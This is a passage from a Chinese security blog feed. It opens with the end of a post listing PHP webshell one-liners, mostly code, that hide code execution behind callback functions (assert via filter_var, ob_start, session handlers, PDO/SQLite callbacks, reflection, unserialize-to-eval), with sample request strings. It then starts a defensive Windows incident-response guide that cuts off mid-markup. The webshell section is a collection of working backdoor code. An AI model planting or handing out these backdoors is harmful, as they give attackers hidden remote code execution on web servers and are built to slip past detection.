php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">register_shutdown_function(<span class="variable">$e</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure><h3 id="register-tick-function"><a href="#register-tick-function" class="headerlink" title="register_tick_function"></a>register_tick_function</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line">register_tick_function (<span class="variable">$e</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure><h3 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var"></a>filter_var</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">filter_var(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>));</span><br><span class="line">filter_var_array(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]), <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;filter&#x27;</span> =&gt; FILTER_CALLBACK, <span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>)));</span><br></pre></td></tr></table></figure><h3 id="mb-ereg-replace-callback"><a href="#mb-ereg-replace-callback" class="headerlink" title="mb_ereg_replace_callback"></a>mb_ereg_replace_callback</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_ereg_replace_callback(<span class="string">&#x27;.+&#x27;</span>, create_function(<span class="string">&#x27;$arr&#x27;</span>, <span class="string">&#x27;return assert($arr[0]);&#x27;</span>),<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure><h3 id="set-exception-handler"><a href="#set-exception-handler" class="headerlink" title="set_exception_handler"></a>set_exception_handler</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set_exception_handler(create_function(&#x27;&#x27;,&#x27;return assert($_GET[k]);&#x27;));</span><br><span class="line">throw new exception();</span><br></pre></td></tr></table></figure><h3 id="forward-static-call"><a href="#forward-static-call" class="headerlink" title="forward_static_call"></a>forward_static_call</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    forward_static_call(<span class="string">&#x27;assert&#x27;</span>,<span class="variable">$args</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> a(<span class="variable">$_POST</span>[k]);</span><br></pre></td></tr></table></figure><h3 id="iterator-apply"><a href="#iterator-apply" class="headerlink" title="iterator_apply"></a>iterator_apply</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iterator_apply(<span class="keyword">new</span> <span class="built_in">arrayiterator</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>])),create_function(<span class="string">&#x27;Iterator $i&#x27;</span>,<span class="string">&#x27;assert($i-&gt;current());&#x27;</span>),<span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">arrayiterator</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]))));</span><br></pre></td></tr></table></figure><h3 id="array-intersect-ukey"><a href="#array-intersect-ukey" class="headerlink" title="array_intersect_ukey"></a>array_intersect_ukey</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_intersect_ukey(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]=&gt;<span class="string">&#x27;1&#x27;</span>),<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]=&gt;<span class="string">&#x27;1&#x27;</span>),<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="array-uintersect-uassoc"><a href="#array-uintersect-uassoc" class="headerlink" title="array_uintersect_uassoc"></a>array_uintersect_uassoc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_uintersect_uassoc(<span class="keyword">array</span>(<span class="variable">$_GET</span>[k]),<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>),<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;strstr&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="array-intersect-uassoc"><a href="#array-intersect-uassoc" class="headerlink" title="array_intersect_uassoc"></a>array_intersect_uassoc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_intersect_uassoc(<span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;k&#x27;</span>]=&gt;<span class="string">&#x27;&#x27;</span>),<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>),<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="filter-var-1"><a href="#filter-var-1" class="headerlink" title="filter_var"></a>filter_var</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var(<span class="string">&quot;phpinfo();&quot;</span> ,<span class="number">1024</span>, <span class="keyword">array</span>(<span class="string">&quot;options&quot;</span> =&gt; <span class="string">&quot;assert&quot;</span>));</span><br></pre></td></tr></table></figure><h3 id="filter-var-array"><a href="#filter-var-array" class="headerlink" title="filter_var_array"></a>filter_var_array</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var_array(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]), <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;filter&#x27;</span> =&gt; FILTER_CALLBACK, <span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>)));</span><br></pre></td></tr></table></figure><h3 id="preg-replace-callback"><a href="#preg-replace-callback" class="headerlink" title="preg_replace_callback"></a>preg_replace_callback</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace_callback(<span class="string">&#x27;/. /i&#x27;</span>, create_function(<span class="string">&#x27;$arr&#x27;</span>, <span class="string">&#x27;return assert($arr[0]);&#x27;</span>), <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure><h3 id="无回显回调后门ob-start"><a href="#无回显回调后门ob-start" class="headerlink" title="无回显回调后门ob_start"></a>无回显回调后门ob_start</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ob_start(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">ob_end_flush();</span><br></pre></td></tr></table></figure><h3 id="create-function创建回调函数"><a href="#create-function创建回调函数" class="headerlink" title="create_function创建回调函数"></a>create_function创建回调函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mem</span> = <span class="keyword">new</span> Memcache();</span><br><span class="line"><span class="variable">$re</span> = <span class="variable">$mem</span>-&gt;addServer(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">11211</span>, <span class="literal">TRUE</span>, <span class="number">100</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="literal">TRUE</span>, create_function(<span class="string">&#x27;$a,$b,$c,$d,$e&#x27;</span>, <span class="string">&#x27;return assert($a);&#x27;</span>));</span><br><span class="line"><span class="variable">$mem</span>-&gt;connect(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="number">11211</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="CallbackFilterIterator创建回调函数"><a href="#CallbackFilterIterator创建回调函数" class="headerlink" title="CallbackFilterIterator创建回调函数"></a>CallbackFilterIterator创建回调函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$iterator</span> = <span class="keyword">new</span> <span class="built_in">CallbackFilterIterator</span>(<span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>],)), create_function(<span class="string">&#x27;$a&#x27;</span>, <span class="string">&#x27;assert($a);&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$iterator</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;<span class="keyword">echo</span> <span class="variable">$item</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="session-set-save-handler"><a href="#session-set-save-handler" class="headerlink" title="session_set_save_handler"></a>session_set_save_handler</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$para</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    session_set_save_handler(<span class="string">&quot;open&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="variable">$para</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;destroy&quot;</span>, <span class="string">&quot;gc&quot;</span>);</span><br><span class="line">    @session_start(); <span class="comment">// 打开会话</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$session</span> = base64_decode(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="comment">// open第一个被调用，类似类的构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$save_path</span>, <span class="variable">$session_name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// close最后一个被调用，类似 类的析构函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行session_id($_REQUEST[&#x27;op&#x27;])后，PHP自动会进行read操作，因为我们为read callback赋值了assert操作，等价于执行assert($_REQUEST[&#x27;op&#x27;])</span></span><br><span class="line">session_id(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;op&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$sess_data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第三个参数为read  read(string $sessionId)</span></span><br><span class="line">test(<span class="variable">$session</span>);</span><br></pre></td></tr></table></figure><h3 id="扩展中的回调函数如sqlite-pdo-yaml-memcached等"><a href="#扩展中的回调函数如sqlite-pdo-yaml-memcached等" class="headerlink" title="扩展中的回调函数如sqlite/pdo/yaml/memcached等"></a>扩展中的回调函数如sqlite/pdo/yaml/memcached等</h3><p>PDO数据库回调</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:sqlite.db3&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;sqliteCreateFunction(<span class="string">&#x27;myfunc&#x27;</span>, <span class="variable">$e</span>, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$sth</span> = <span class="variable">$db</span>-&gt;prepare(<span class="string">&quot;SELECT myfunc(:exec)&quot;</span>);</span><br><span class="line"><span class="variable">$sth</span>-&gt;execute(<span class="keyword">array</span>(<span class="string">&#x27;:exec&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>SQLite3 数据库回调</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;sqlite.db3&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;createFunction(<span class="string">&#x27;myfunc&#x27;</span>, <span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;prepare(<span class="string">&quot;SELECT myfunc(?)&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;bindValue(<span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], SQLITE3_TEXT);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;execute();</span><br></pre></td></tr></table></figure><p>php_yaml库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = urlencode(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="variable">$yaml</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">greeting: !<span class="subst">&#123;$str&#125;</span> &quot;|. |e&quot;</span></span><br><span class="line"><span class="string">EOD</span>;</span><br><span class="line"><span class="variable">$parsed</span> = yaml_parse(<span class="variable">$yaml</span>, <span class="number">0</span>, <span class="variable">$cnt</span>, <span class="keyword">array</span>(<span class="string">&quot;!<span class="subst">&#123;$_REQUEST[&#x27;pass&#x27;]&#125;</span>&quot;</span> =&gt; <span class="string">&#x27;preg_replace&#x27;</span>));</span><br></pre></td></tr></table></figure><h2 id="反射技术"><a href="#反射技术" class="headerlink" title="反射技术"></a>反射技术</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="keyword">new</span> ReflectionFunction(<span class="variable">$_GET</span>[m]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$func</span>-&gt;invokeArgs(<span class="keyword">array</span>(<span class="variable">$_GET</span>[c]));</span><br></pre></td></tr></table></figure><blockquote><p><code>xx.com/shell.php?m=assert&amp;c=phpinfo();</code></p></blockquote><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>=<span class="string">&quot;text&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file_name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php?id=id=O:<span class="number">3</span>:<span class="string">&quot;foo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> php </tag>
            
            <tag> Webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows应急溯源</title>
      <link href="/p/f6d1c791.html"/>
      <url>/p/f6d1c791.html</url>
      
        <content type="html"><![CDATA[<p>我非常赞同曾经看到的一句话，<strong>一旦你能够确定本次安全事件的类型，猜测出攻击者或者恶意代码的攻击思路，然后去验证排查这些猜想，就会加速你的分析过程</strong>。在做应急溯源的过程中，很多时候通过一两点线索，拼凑攻击者链条的画像，用下文提到的排查方法，去补充证据来证明自己的猜想。（正如打游戏要预判敌人走位，应急也要预判攻击者的行为）当然受限于自己知识的局限性还是很可能误判的，在应急中误判又是特别致命的，可能一个误操作就会为客户带来不可估量的损失。所以我个人认为现场溯源应急至少要3个人以上，互相弥补吧。</p><h1 id="系统基本信息"><a href="#系统基本信息" class="headerlink" title="系统基本信息"></a>系统基本信息</h1><p>系统信息概述</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>详细信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msinfo32</span><br></pre></td></tr></table></figure><blockquote><p>显示本地计算机硬件资源、组件、软件环境；正在运行的任务，服务、驱动、加载模块、启动程序</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211119110244574.png" alt="image-20211119110244574"></p><ul><li>正在运行的任务</li><li>服务</li><li>驱动程序</li><li>加载的模块</li><li>启动程序</li></ul><h2 id="系统账号（用户信息）"><a href="#系统账号（用户信息）" class="headerlink" title="系统账号（用户信息）"></a>系统账号（用户信息）</h2><p>预判攻击者利用账号的可能性：</p><ol><li>直接建立新账号（可能和系统常用名类似）</li><li>激活系统中默认账号（这个账号存在很久不经常使用）</li><li>创建隐藏账号（账户名后<code>$</code>）</li></ol><h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p>查看具体账号的详细信息，<code>username</code>为具体用户名</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user username</span><br></pre></td></tr></table></figure><h3 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lusrmgr.msc</span><br></pre></td></tr></table></figure><p><code>win+r</code> –&gt; <strong>compmgmt.msc</strong>(计算机管理窗口) –&gt; 本地用户和组 –&gt; 用户</p><h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><p><code>win+r</code> –&gt;<strong>regedit</strong>(注册表编辑器) –&gt; HKEY_LOCAL_MACHINE –&gt; SAM</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211119114330813.png" alt="image-20211119114330813"></p><blockquote><p>启动继承，方框✔；F5刷新后查看用户信息。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211119114848417.png" alt="image-20211119114848417"></p><h4 id="克隆账号"><a href="#克隆账号" class="headerlink" title="克隆账号"></a>克隆账号</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211119114530559.png" alt="image-20211119114530559"></p><p>计算机<code>\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code></p><p><strong>F值</strong>和<code>000001F4</code>相同即为克隆账户</p><h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><h3 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msconfig</span><br></pre></td></tr></table></figure><blockquote><p>在系统配置对话框中选择启动选项卡</p></blockquote><h3 id="注册表-1"><a href="#注册表-1" class="headerlink" title="注册表"></a>注册表</h3><p>注册表是操作是操作系统中重要的数据库，很多病毒通过注册表来实现持久化驻留。</p><p>注册表含义：</p><p>(1)<code>HKEY_CLASSES_ROOT(HKCR)</code> 确保资源管理器中执行时打开正确的程序</p><p>(2)<code>HKEY_CURRENT_USER(HKCU)</code> 当前登录系统的用户配置</p><p>(3)<code>HKEY_LOCAL_MACHINE(HKLM)</code> 计算机硬件特定信息</p><p>(4)<code>HKEY_USERS(HKU)</code> 所有用户配置文件的配置信息</p><p>(5)<code>HKEY_CURRENT_CONFIG(HCU)</code> 存储有关系统当前配置信息</p><h3 id="Autoruns"><a href="#Autoruns" class="headerlink" title="Autoruns"></a>Autoruns</h3><p><a href="https://www.sysgeek.cn/autoruns/">https://www.sysgeek.cn/autoruns/</a></p><h2 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h2><p>cmd下执行命令<code>compmgmt.msc</code>(计算机管理窗口) –&gt; 任务计划程序</p><p>powershell执行<code>Get-ScheduledTask</code>返回路径，名称，状态</p><p>命令行下执行<code>schtasks</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件夹: \Microsoft\XblGameSave</span><br><span class="line">任务名                                   下次运行时间           模式</span><br><span class="line">======================================== ====================== ===============</span><br><span class="line">XblGameSaveTask                          N/A                    就绪</span><br></pre></td></tr></table></figure><blockquote><p>获取任务计划必须是本地Administrators组的</p></blockquote><h1 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h1><p>主要目的：找到恶意进程的PID、程序路径、PPID、程序加载的DLL。</p><p><code>taskmgr</code>    添加命令行和映射路径名称</p><h2 id="tasklist"><a href="#tasklist" class="headerlink" title="tasklist"></a>tasklist</h2><p>在cmd执行<code>tasklist</code>映像名称,PID 会话名,会话,内存使用</p><p><code>tasklist /svc</code>  映像名称–PID–服务 #进程和服务的对应关系</p><p><code>tasklist /m | more</code> 映像名称–PID–模块 #加载DLL的恶意进程</p><p><code>tasklist /m ntdll.dll</code> 查看指定模块的进程（如ntdll.dll）</p><h3 id="fi过滤器"><a href="#fi过滤器" class="headerlink" title="fi过滤器"></a><code>fi</code>过滤器</h3><p><code>eq</code> 等于</p><p><code>ne</code> 不等于</p><p><code>gt</code> 大于</p><p><code>lt</code> 小于</p><p><code>ge</code> 大于等于</p><p><code>le</code> 小于等于</p><p><code>tasklist /svc /fi &#39;PID eq 7440&#39;</code>  #PID为7440的进程</p><h2 id="netstat-网络信息查询"><a href="#netstat-网络信息查询" class="headerlink" title="netstat 网络信息查询"></a>netstat 网络信息查询</h2><p>1.通过netstat定位有网络连接的PID</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;ESTABLISHED&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>LISTENING:监听状态</p><p>ESTABLISHED:建立连接</p><p>CLOSE_WAIT:对方主动关闭连接，或网络异常导致连接中断</p></blockquote><p>2.通过tasklist对PID程序定位</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tasklist|findstr <span class="string">&quot;12308&quot;</span></span><br><span class="line">chrome.exe                   <span class="number">12308</span> Console                    <span class="number">1</span>     <span class="number">31</span>,<span class="number">252</span> K</span><br><span class="line">tasklist /fi <span class="string">&quot;PID eq 12308&quot;</span></span><br><span class="line"></span><br><span class="line">映像名称                       PID 会话名              会话<span class="comment">#       内存使用</span></span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">chrome.exe                   <span class="number">12308</span> Console                    <span class="number">1</span>     <span class="number">30</span>,<span class="number">764</span> K</span><br></pre></td></tr></table></figure><p><code>netstat -anb</code> #快速定位端口对应程序(需要管理员权限)</p><p>或者使用TCPView</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211122145838245.png" alt="image-20211122145838245"></p><h2 id="powershell排查确认子父进程之间的关系"><a href="#powershell排查确认子父进程之间的关系" class="headerlink" title="powershell排查确认子父进程之间的关系"></a>powershell排查确认子父进程之间的关系</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> Win32_Process | <span class="built_in">select</span> name,processid,parentprocessid,path</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> Win32_Process</span><br></pre></td></tr></table></figure><blockquote><p>获取进程的所有信息</p></blockquote><h2 id="wmic-process"><a href="#wmic-process" class="headerlink" title="wmic process"></a>wmic process</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wmic <span class="keyword">process</span> get name,processid,parentprocessid /format:csv</span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> get name,ExecutablePath,processid /format:csv</span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> get name,ExecutablePath,processid,parentprocessid /format:csv</span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> get name,ExecutablePath,processid,parentprocessid /format:csv|findstr /I <span class="string">&quot;SearchFilterHost&quot;</span></span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> <span class="built_in">where</span> processid=[<span class="type">PID</span>] get parentprocessid</span><br></pre></td></tr></table></figure><p>结束恶意进程</p><figure class="highlight 